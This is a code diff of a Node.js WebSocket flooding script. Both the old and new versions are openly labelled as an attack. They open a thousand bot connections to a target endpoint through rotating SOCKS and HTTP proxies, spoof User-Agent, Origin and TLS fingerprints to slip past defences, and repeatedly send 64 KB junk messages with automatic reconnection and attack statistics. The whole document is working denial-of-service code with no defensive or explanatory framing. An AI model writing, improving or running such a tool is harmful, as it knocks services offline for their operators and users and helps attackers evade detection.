@@ -1,215 +1,148 @@
 const WebSocket = require('ws');
-const { SocksProxyAgent } = require('socks-proxy-agent');
 const fs = require('fs');
+const https = require('https');
 const tls = require('tls');
-const crypto = require('crypto');
+const SocksProxyAgent = require('socks-proxy-agent');
+const HttpsProxyAgent = require('https-proxy-agent');
 
-// ===== CONFIGURATION =====
-const TARGET = "wss://target.com/ws";
+// Configuration
+const TARGET = "wss://target-site.com/ws";
 const CONCURRENT_CONNECTIONS = 1000;
-const PROXY_FILE = 'proxy.txt'; // Format: socks5://user:pass@ip:port or http://user:pass@ip:port
-const MIN_CONNECTION_DELAY_MS = 10;
-const MAX_CONNECTION_DELAY_MS = 500;
-const MIN_MESSAGE_INTERVAL_MS = 50;
-const MAX_MESSAGE_INTERVAL_MS = 300;
-const MAX_FRAGMENT_SIZE = 16384; // 16KB fragments
+const DELAY_BETWEEN_CONNECTIONS = 10; // ms
+const MESSAGE_INTERVAL = 100; // ms
+const PAYLOAD_SIZE = 65536; // bytes
 
-// Load proxies from file
-let PROXIES = [];
-try {
-    const proxyData = fs.readFileSync(PROXY_FILE, 'utf-8');
-    PROXIES = proxyData.split('\n')
-        .map(line => line.trim())
-        .filter(line => line && !line.startsWith('#'));
-    console.log(`[+] Loaded ${PROXIES.length} proxies from ${PROXY_FILE}`);
-} catch (err) {
-    console.error(`[!] Error loading proxy file: ${err.message}`);
-    process.exit(1);
-}
+// Load resources
+const PROXIES = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(p => p.trim());
+const USER_AGENTS = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(ua => ua.trim());
 
-// User-Agents
-const USER_AGENTS = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    // ... add more user agents ...
-];
-
-// ===== ATTACK STATISTICS =====
-const stats = {
-    totalConnectionsAttempted: 0,
-    successfulConnections: 0,
-    failedConnections: 0,
-    messagesSent: 0,
-    startTime: Date.now(),
-    activeConnections: new Set(),
-    proxiesRotated: 0,
-    deadProxies: new Set()
+// TLS fingerprinting configuration
+const TLS_OPTIONS = {
+  ciphers: [
+    'TLS_AES_128_GCM_SHA256',
+    'TLS_AES_256_GCM_SHA384',
+    'TLS_CHACHA20_POLY1305_SHA256',
+    'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
+    'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
+    'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
+    'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
+    'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256',
+    'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256'
+  ].join(':'),
+  honorCipherOrder: true,
+  minVersion: 'TLSv1.2'
 };
 
-// ===== PROXY ROTATION SYSTEM =====
-function getNextProxy() {
-    if (PROXIES.length === 0) return null;
-    
-    // Rotate through proxies sequentially
-    const proxy = PROXIES[stats.proxiesRotated % PROXIES.length];
-    stats.proxiesRotated++;
-    
-    return proxy;
-}
+// Attack status tracking
+const attackStatus = {
+  totalConnections: 0,
+  activeConnections: 0,
+  failedConnections: 0,
+  messagesSent: 0,
+  startTime: Date.now()
+};
 
-function markProxyDead(proxy) {
-    if (!proxy) return;
-    stats.deadProxies.add(proxy);
-    console.log(`[!] Marked proxy as dead: ${proxy}`);
-    
-    // Optional: Remove dead proxy from rotation
-    // PROXIES = PROXIES.filter(p => p !== proxy);
-}
-
-// ===== MAIN ATTACK CODE =====
-async function launchAttack() {
-    console.log(`[+] Starting advanced attack with ${PROXIES.length} proxies`);
-    
-    for (let i = 0; i < CONCURRENT_CONNECTIONS; i++) {
-        const delay = getRandomInterval(MIN_CONNECTION_DELAY_MS, MAX_CONNECTION_DELAY_MS);
-        setTimeout(() => createBot(i), i * delay);
-    }
-}
-
-// ===== BOT CREATION =====
-function createBot(botId) {
-    stats.totalConnectionsAttempted++;
-    const connectionId = `${botId}-${stats.totalConnectionsAttempted}`;
-    
-    const proxyUrl = getNextProxy();
-    let agent = null;
-    
-    try {
-        if (proxyUrl) {
-            agent = new SocksProxyAgent(proxyUrl, {
-                timeout: 10000,
-                keepAlive: true
-            });
-        }
-    } catch (err) {
-        console.error(`[!] Proxy error (${proxyUrl}): ${err.message}`);
-        markProxyDead(proxyUrl);
-        return;
-    }
-    
-    const wsOptions = {
-        headers: {
-            "User-Agent": getRandomUserAgent(),
-            "Origin": "https://google.com",
-            "Accept-Language": "en-US,en;q=0.9"
-        },
-        agent: agent,
-        handshakeTimeout: 15000,
-        rejectUnauthorized: false
-    };
-    
-    // TLS fingerprint spoofing
-    wsOptions.createConnection = (defaultCreateConnection) => {
-        return (options) => {
-            const socket = defaultCreateConnection(options);
-            socket.setMaxSendFragment(MAX_FRAGMENT_SIZE);
-            return Object.assign(socket, {
-                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384',
-                honorCipherOrder: true,
-                minVersion: 'TLSv1.2'
-            });
-        };
-    };
-    
-    const ws = new WebSocket(TARGET, wsOptions);
-    stats.activeConnections.add(connectionId);
-    
-    ws.on('open', () => {
-        stats.successfulConnections++;
-        console.log(`[+] ${connectionId} connected via ${proxyUrl || 'DIRECT'}`);
-        
-        const sendPayload = () => {
-            if (ws.readyState !== ws.OPEN) return;
-            
-            try {
-                // Generate random payload
-                const payload = {
-                    attackId: connectionId,
-                    timestamp: Date.now(),
-                    data: crypto.randomBytes(64).toString('hex')
-                };
-                
-                // Fragment and send
-                const fragments = fragmentMessage(JSON.stringify(payload));
-                fragments.forEach((frag, i) => {
-                    setTimeout(() => {
-                        if (ws.readyState === ws.OPEN) {
-                            ws.send(frag, { fin: i === fragments.length - 1 });
-                            stats.messagesSent++;
-                        }
-                    }, i * 15); // Stagger fragments
-                });
-                
-                // Schedule next message with random delay
-                setTimeout(sendPayload, getRandomInterval(MIN_MESSAGE_INTERVAL_MS, MAX_MESSAGE_INTERVAL_MS));
-            } catch (err) {
-                console.error(`[!] ${connectionId} send error:`, err.message);
-            }
-        };
-        
-        // Start message loop
-        setTimeout(sendPayload, getRandomInterval(0, 1000));
-    });
-    
-    ws.on('error', (err) => {
-        stats.failedConnections++;
-        console.error(`[!] ${connectionId} error via ${proxyUrl || 'DIRECT'}:`, err.message);
-        if (proxyUrl) markProxyDead(proxyUrl);
-        stats.activeConnections.delete(connectionId);
-    });
-    
-    ws.on('close', () => {
-        stats.activeConnections.delete(connectionId);
-        console.log(`[-] ${connectionId} disconnected`);
-    });
-}
-
-// ===== UTILITY FUNCTIONS =====
-function getRandomUserAgent() {
-    return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
-}
-
-function getRandomInterval(min, max) {
-    return Math.floor(Math.random() * (max - min + 1)) + min;
-}
-
-function fragmentMessage(message) {
-    const fragments = [];
-    for (let i = 0; i < message.length; i += MAX_FRAGMENT_SIZE) {
-        fragments.push(message.substring(i, i + MAX_FRAGMENT_SIZE));
-    }
-    return fragments;
-}
-
-// ===== STATS REPORTING =====
+// Log status periodically
 setInterval(() => {
-    const duration = (Date.now() - stats.startTime) / 1000;
-    console.log(`
-=== ATTACK STATS ===
-Duration: ${duration.toFixed(1)}s
-Connections: ${stats.successfulConnections}/${stats.totalConnectionsAttempted} (${stats.failedConnections} failed)
-Active: ${stats.activeConnections.size}
-Messages: ${stats.messagesSent} (${(stats.messagesSent/duration).toFixed(1)}/sec)
-Proxies: ${stats.proxiesRotated} rotations, ${stats.deadProxies.size} dead
-    `);
+  const duration = Math.floor((Date.now() - attackStatus.startTime) / 1000);
+  console.log(`[STATUS] ${new Date().toISOString()} | Duration: ${duration}s | ` +
+    `Connections: ${attackStatus.activeConnections}/${attackStatus.totalConnections} | ` +
+    `Failed: ${attackStatus.failedConnections} | Messages: ${attackStatus.messagesSent}`);
 }, 5000);
 
-// Start the attack
-launchAttack().catch(console.error);
+function getRandomUserAgent() {
+  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
+}
 
-// Clean exit handler
+function getRandomProxy() {
+  if (PROXIES.length === 0) return null;
+  const proxy = PROXIES[Math.floor(Math.random() * PROXIES.length)].trim();
+  
+  if (proxy.startsWith('socks')) {
+    return new SocksProxyAgent(proxy);
+  } else {
+    return new HttpsProxyAgent(proxy);
+  }
+}
+
+function createCustomTlsSocket() {
+  return tls.connect({
+    ciphers: TLS_OPTIONS.ciphers,
+    honorCipherOrder: TLS_OPTIONS.honorCipherOrder,
+    minVersion: TLS_OPTIONS.minVersion
+  });
+}
+
+function createBot() {
+  attackStatus.totalConnections++;
+  
+  const options = {
+    headers: {
+      "User-Agent": getRandomUserAgent(),
+      "Origin": "https://legitimate-site.com",
+      "Accept-Language": "en-US,en;q=0.9",
+      "Cache-Control": "no-cache",
+      "Pragma": "no-cache"
+    },
+    agent: getRandomProxy(),
+    createConnection: createCustomTlsSocket
+  };
+
+  const ws = new WebSocket(TARGET, options);
+  attackStatus.activeConnections++;
+
+  let messageInterval;
+  
+  ws.on('open', () => {
+    messageInterval = setInterval(() => {
+      try {
+        ws.send(JSON.stringify({
+          "payload": "A".repeat(PAYLOAD_SIZE),
+          "timestamp": Date.now()
+        }));
+        attackStatus.messagesSent++;
+      } catch (e) {
+        console.error('Send error:', e.message);
+      }
+    }, MESSAGE_INTERVAL);
+  });
+
+  ws.on('error', (e) => {
+    attackStatus.failedConnections++;
+    attackStatus.activeConnections--;
+    clearInterval(messageInterval);
+  });
+
+  ws.on('close', () => {
+    attackStatus.activeConnections--;
+    clearInterval(messageInterval);
+    
+    // Optional: reconnect automatically
+    setTimeout(createBot, Math.random() * 10000);
+  });
+
+  return ws;
+}
+
+// Start the attack
+console.log(`Starting WebSocket attack on ${TARGET}`);
+console.log(`Initializing ${CONCURRENT_CONNECTIONS} connections...`);
+
+for (let i = 0; i < CONCURRENT_CONNECTIONS; i++) {
+  setTimeout(() => {
+    try {
+      createBot();
+    } catch (e) {
+      console.error('Connection error:', e.message);
+      attackStatus.failedConnections++;
+    }
+  }, i * DELAY_BETWEEN_CONNECTIONS);
+}
+
+// Handle process termination
 process.on('SIGINT', () => {
-    console.log('\n[!] Stopping attack...');
-    console.log('=== FINAL STATS ===');
-    console.log(stats);
-    process.exit();
+  console.log('\nAttack stopped by user');
+  console.log('Final statistics:');
+  console.log(attackStatus);
+  process.exit();
 });
